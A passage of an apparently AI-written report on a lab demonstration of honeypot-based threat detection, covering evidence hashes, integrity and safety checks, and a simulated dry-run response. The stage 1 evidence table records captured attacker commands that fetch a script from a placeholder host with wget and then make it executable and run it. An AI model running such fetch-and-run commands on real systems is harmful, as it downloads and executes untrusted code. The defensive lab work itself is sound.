| operator verification | `dry_run_confirmed_no_effect`, `v-20261112T073151Z-ba1005`; audit record `0f845962…` |
| **simulated** rollback | `rollback_verified`; audit record `461fbb6c…` |
| final | `rolled_back`; response_success true; 11 rejected operations; enforcement calls `[]` |

**Metrics** (`feedback.metrics`): 1 proposal, final state `rolled_back`, 1 success, 0 failures, labels `true_positive` 1, 11 rejected operations. Note: "dry-run metrics; no real response was executed".

**Layer separation:**
- The feedback is stored only in the response/feedback audit layer (`artifacts/response/response_audit.jsonl`), a separate hash chain.
- The assessment audit log `artifacts/assessment/audit.jsonl` has the same hash before and after the response and feedback steps (checked).
- Behavioural evidence, assessment decisions, severity, clustering and novelty were not touched.

## 15.6 Session-to-response traceability
```
Cowrie session 42ee73a7cbbd (captured slice 50c0f942…, Task 29C live run 20261112T070531Z-670781)
 └─ relay records seq 12/13, connection 93daae7d…, client 10.250.25.3:47200 (verified, real relay public key)
     └─ DEMO-signed attribution DEMO-20261112T073151Z-ba1005 (result_hash 6d449820…, DEMO key aabbbc64…)
         └─ threat assessment: propose, gates 1–8 true; assessment record task26c-isolated-000001 (a1ce3cd5…)
             └─ response proposal prop-task26c-isolated-000001 (7b1c8307…), target 10.250.25.3/32, max 900 s
                 └─ DEMO approval appr-65ee4e38-… (ab7977c3…) → rule rule-37638088-… (600 s)
                     └─ SIMULATED restriction → operator verification (no effect) → SIMULATED rollback → rolled_back
                         └─ feedback annotation faa37213… ; feedback_record.json cea0f273…
```

## 15.7 Output files and hashes
Evidence folder: `reports/academic_demo_readiness_20261112/assessment/20261112T073151Z-ba1005/`. It has its own `SHA256SUMS` covering 22 files; all verify.

| File | SHA-256 |
|---|---|
| `artifacts/input_signed_result_DEMO-…json` | `d0ebbbb2e50e6e1b8bafddf121d2fd8cfa0d7b91c285b6c1b26db68b86aa2923` |
| `artifacts/assessment/assessments.jsonl` | `54333405b5fdd1344dad3a4e6c72b1259ff30f296c98dd1c025479f9b5a2d609` |
| `artifacts/assessment/audit.jsonl` | `b0963bf81a12a2982641156c71d011edbdf2eab9e7f0847a0c705e4fb4eb6120` |
| `artifacts/response/proposal.json` | `f300397e188f1764c2f49e6ea90f905cc0b7a844ce12e6c09fb390e28d9afbf9` |
| `artifacts/response/approval.json` | `f02b0bb287b652b1eebb89e38bc3a17cca2d3052b0d68e7d11b3c383c10cd8c0` |
| `artifacts/response/approval_negative_tests.json` | `55af4f111020c3685bd31748598a5e73dbcdf34a3bef579fabcce40250888d57` |
| `artifacts/response/response_audit.jsonl` | `a51398487955fa61a1171ee29f0e97053402c51fee896e444cfa2a149eb1844c` |
| `artifacts/response/feedback_record.json` | `cea0f2739c80cf465e72fc537a06431325ba18bc6a6b2321e85e6a511214e421` |
| `run_summary.json` | `b292eb947367fb4c883193592c144b8ae492abf15410e4972fa83ae90a36e2c5` |

**Unchanged:** `scripts/parse_logs.py` / `scripts/extract_features.py` (`4987a671…` / `6524aedf…`); `configs/session_exclusions_v2.json` / `v1` (`92015d64…` / `cd3b7648…`). Both work folders are empty after cleanup.

**Production configuration and keys:** the host audit hook shows nothing under `configs/` except the read-only exclusions lookup, and no `secrets/`, Cowrie log, Dataset V2 or sealed path. The container loaded only DEMO inputs. All signing keys (result, approver and the rogue negative-test key) were temporary and in memory.

## 15.8 Tests
- **Full suite:** **822 passed**, 0 failed (`full_test_suite_29e.txt`).
- **Regression rehearsal** after the script changes: synthetic run `rehearsal/20261112T073108Z-c6d219`, 35 of 35 passed.

## 15.9 Errors, limitations and changes
1. **Script changes** (demo script only; no project code changed):
   - `--with-response` (`assess` mode only);
   - `response_demo()`, which drives the existing controller, approval and feedback functions with the validation and negative cases above;
   - `SpyDisabledEnforcement`, a recording subclass of the unchanged disabled boundary.
2. **Action naming.** The assessor proposes `block_source_ip`; the dry-run controller's only action is `restrict_new_connections` on the demo listener, for the same single target. This mapping is existing behaviour (Task 27B design), not a change.
3. **Operator verification is simulated.** It records that no restriction was observed and the control was unaffected, which is what a dry-run must show. No live connectivity test was made, because that would need a new network session.
4. **Proposal ID.** The ID `prop-task26c-isolated-000001` comes from the existing `run_signed` audit run ID (`task26c-isolated`). It is unique within this run's audit, but the same ID appears in other runs' audits. The proposal hash and the signed result ID are the unique references.
5. **Exception record wording.** The exception record's scope text still says "dry-run response/feedback only after separate approval". That approval is this task (29E).
6. **No errors.** All 51 checks passed on the first run of this task.

Stopped after the dry-run response and feedback.

---

# Task 29F — Final demonstration validation and packaging (2026-11-12)

**Status: ready to present.**
- The saved evidence for all ten stages of session **`42ee73a7cbbd`** passes **all 28** integrity, consistency and safety checks.
- A read-only presentation script, its captured transcript and a demonstration guide are in this folder.
- **Not done:** no new network session, no rerun of the live attack, no change to evidence, architecture, gates or models, no enforcement, nothing committed.

## 16.1 Deliverables (this folder)

| File | Purpose |
|---|---|
| `demo_presentation.py` | **Read-only.** It first re-verifies all `SHA256SUMS`, session consistency, signatures, hashes, audit references, exclusions, the exception and the safety evidence. It then prints Sections A–E from saved evidence only. It writes no file, starts no process and opens no network connection. Every line is labelled `[OBSERVED]`, `[MODEL]`, `[DECISION]`, `[SIMULATED]` or `[VERIFIED]`, and the last line is `ACTUAL_BLOCKING: NOT_EXECUTED` |
| `demo_transcript_29f.txt` | the captured output of `demo_presentation.py` (expected output and fallback) |
| `DEMO_GUIDE.md` | preparation and demonstration commands, expected output, the stage-to-evidence map, recovery steps, and the limitations to disclose |
| `final_validation_29f/firewall_check.txt` | 29F read-only host firewall and witness check |
| `final_validation_29f/full_test_suite_29f.txt` | full test-suite result |

**Commands:** `python reports/academic_demo_readiness_20261112/demo_presentation.py` to present, and `--verify` for the checks only.

## 16.2 Evidence chain (ten stages)

| # | Stage | Evidence | Verified value |
|---|---|---|---|
| 1 | Cowrie honeypot | `live/20261112T070531Z-670781/artifacts/raw/cowrie_slice.json` | 14 events; login success `demo`; commands `uname -a`, `wget http://files.example/x.sh -O x.sh`, `chmod +x x.sh`, `./x.sh`, `exit`; duration 10.5 s |
| 2 | Log collection | the same file and `run_summary.json` → `cowrie_slice` | only lines after the 21,888-line baseline (rotation verified) |
| 3 | Session reconstruction | `…/parsed/sessions.json`, `session_details.json` | 1 session, 5 commands, `auth_success = 1`, 10.600798 s |
| 4 | Feature extraction | `…/parsed/behavior_features.csv` | 1 row × 29 columns. The DEC model input is 17 features (saved `config.json`) |
| 5 | DEC clustering | `…/processed/dec_results.csv` | cluster 1, confidence 0.924 (0.047 / 0.924 / 0.029) |
| 6 | Pattern analysis | `…/ml/behaviour_analysis/` | approved 5-session baseline, all in cluster 1 |
| 7 | Signature generation | `…/ml/behaviour_signatures/` | `sig-4e22763125d03876` (5 sessions, confidence 0.8375) |
| 8 | Novelty assessment | `…/ml/novelty/` | Known-like, score 0.774 (threshold 0.7) |
| 9 | Threat scoring and rules | `assessment/20261112T073151Z-ba1005/artifacts/assessment/` | E2; action indicators XFER-1 and EXEC-1; login evidence `login_success_observed`; attributed to 10.250.25.3; gates 1–8 pass; **propose** |
| 10 | Dynamic response and feedback | `assessment/20261112T073151Z-ba1005/artifacts/response/` | proposal `7b1c8307…`; DEMO approval accepted (6 invalid approvals refused); **SIMULATED** restriction, verification and rollback; feedback `cea0f273…`; final state `rolled_back` |

**Both branches reference the same session.** The session ID is `42ee73a7cbbd` in all **12** places checked:
- the 29C run, the slice, reconstruction, features, DEC and novelty (ML branch);
- the 29E run, the behavioural evidence, the assessment, the signed result, the proposal and the feedback (rules branch).

The ML branch and the rules branch (in both 29D and 29E) consumed the **same captured bytes** (`50c0f942…`). The design stays independent: **DEC and novelty do not feed threat scoring**, and the presentation says so.

## 16.3 Integrity verification (the 28 checks run by `demo_presentation.py`)

| Area | Result |
|---|---|
| Manifests | top-level `SHA256SUMS` matches. Section manifests match: `live/…670781` 25 of 25, `assessment/…034f7b` 17 of 17, `assessment/…ba1005` 22 of 22 |
| Session consistency | 12 of 12 places say `42ee73a7cbbd`; the same bytes went into both branches and into the 29D run |
| Signed attribution | `DEMO-20261112T073151Z-ba1005`. Its `result_hash` recomputes, and the **Ed25519 signature verifies offline** with the saved DEMO public key (pin matches the signer). The assessment accepted exactly this result |
| Assessment audit | chain verifies; the proposal references the assessment record (`a1ce3cd5…`) |
| Proposal | `proposal_hash 7b1c8307…0648` recomputes; it is bound to the signed result ID and hash |
| Approval | `approval_hash` recomputes and names this proposal hash; the audit `approval_recorded` entry references it |
| Response and feedback audit | 19 entries, chain and transitions intact, all `dry_run`. `proposal_created` references the proposal hash and the signed result |
| Feedback | the core hash `e794b367…` recomputes and is cited in the audit annotation (`faa37213…`). The approval, simulated, verification and rollback audit hashes all match |
| Exclusions | v2.0.0, exactly the 8 IDs (7 earlier plus `42ee73a7cbbd`), digest `2a50f53f…` |
| Demonstration exception | admits only `42ee73a7cbbd` when it is named; **24 of 24** misuse attempts were refused (the 7 other excluded IDs with 3 requests each, plus 3 wrong requests) |

## 16.4 Final safety verification

| Claim | Evidence |
|---|---|
| No firewall rule created | 29F read-only check in the Docker engine network namespace (`dockerd`, PID 165): no rule in `filter`, `nat`, `mangle` or `raw` mentions 10.250.25.3 or .4, and 0 nft lines (`final_validation_29f/firewall_check.txt`) |
| No real IP restriction | all response events are `dry_run`; `simulated` has `enforced: false` ("no rule staged, relay not contacted"); the rollback is `simulated: true`, `relay_contacted: false` |
| Enforcement interface never called | recorded calls `[]` in the feedback record and the run summary. `enforce` mode was refused |
| No production witness | 0 witness containers; no witness configuration used |
| No production key | all signing keys were temporary DEMO keys. Only the relay **public** key was read. No run opened `secrets/` (host audit hooks of the 29C, 29D and 29E runs) |
| No sealed test data | no `ml_pipeline/work` or sealed path in any run's opened-files list |
| No Dataset V2 raw data | no Dataset V2 or `data/raw` path in any opened-files list |
| No excluded session as a new evaluation input | the novelty reference baseline has 5 sessions, none excluded. The fresh-session novelty run is mode `independent` with 0 overlap. `42ee73a7cbbd` is excluded for datasets, training and evaluation. Its later processing was rules-branch demonstration only, under the single-ID exception |
| Subprocesses | 7 in total across the three runs: the pipeline scripts, one read-only Cowrie slice `docker exec`, and the assessment container (`network_mode: none`). None touched a firewall, the relay or the demo clients |

**Full test suite (29F):** **822 passed**, 0 failed (`final_validation_29f/full_test_suite_29f.txt`).

## 16.5 Limitations to disclose (also in `DEMO_GUIDE.md` §6)
1. **Simulated response:**
   - the response is dry-run only, and operator verification and rollback are simulated records;
   - the assessor's `block_source_ip` is carried out as `restrict_new_connections` on the demo listener, for the same target.
2. **DEMO trust:**
   - the signing keys were temporary;
   - the production result key and approver registry are not provisioned, and the witness is not deployed (D0 blocked);
   - the **approver public key was not saved**, so the approval signature was verified by the controller at run time and only its hash can be recomputed now.
3. **One controlled session:** a lab test client, not a real attacker. The download and execution are attempts only (EXEC-1 is inferred).
4. **Small ML baseline:** 5 sessions and one signature. The V1 `attack_cat` and `label` are defaults. The auxiliary `model_input.csv` is all zeros and is not used by DEC.
5. **Independent branches:** DEC and novelty do not feed threat scoring.
6. **Exclusion handling:** the session is globally excluded, and the single-ID exception exists only in the demo script.
7. **Working-tree edits:** `parse_logs.py` and `extract_features.py` carry uncommitted edits; their hashes were recorded and unchanged.
8. **Log collection:** a line-boundary slice instead of `collect_logs.py`; Cowrie's daily rotation occurred and was verified.
9. **Proposal ID:** it repeats across runs; use the proposal hash and the signed result ID.

## 16.6 Changes in 29F
- **New files:** `demo_presentation.py`, `DEMO_GUIDE.md`, `demo_transcript_29f.txt`, and `final_validation_29f/` (`firewall_check.txt`, `full_test_suite_29f.txt`).
- **Updated:** this report and the top-level `SHA256SUMS`.
- **Unchanged:** no evidence file was modified or deleted, all section manifests still verify, and no project code changed.

**Process note:** a first background run of the test suite could not write its result file because the shell could not resolve the relative output path. I re-ran it in the foreground with an absolute path; it gives 822 passed.

Stopped.

**Post-29F fix (interpreter):**
- **Problem:** running `python …demo_presentation.py` in a PowerShell session where the project venv is not active uses the global Python (`C:\Program Files\Python311`). That interpreter lacks `cryptography`, and the script stopped with a traceback.
- **Fix:**
  - `demo_presentation.py` now catches missing imports and prints the exact project-interpreter command (exit code 2) instead of a traceback.
  - `DEMO_GUIDE.md` now uses `.\.venv\Scripts\python.exe` for every command.
- **Verified:** the global Python gives the clear message; `.\.venv\Scripts\python.exe … --verify` passes 28 of 28. No package was installed, and no evidence changed.
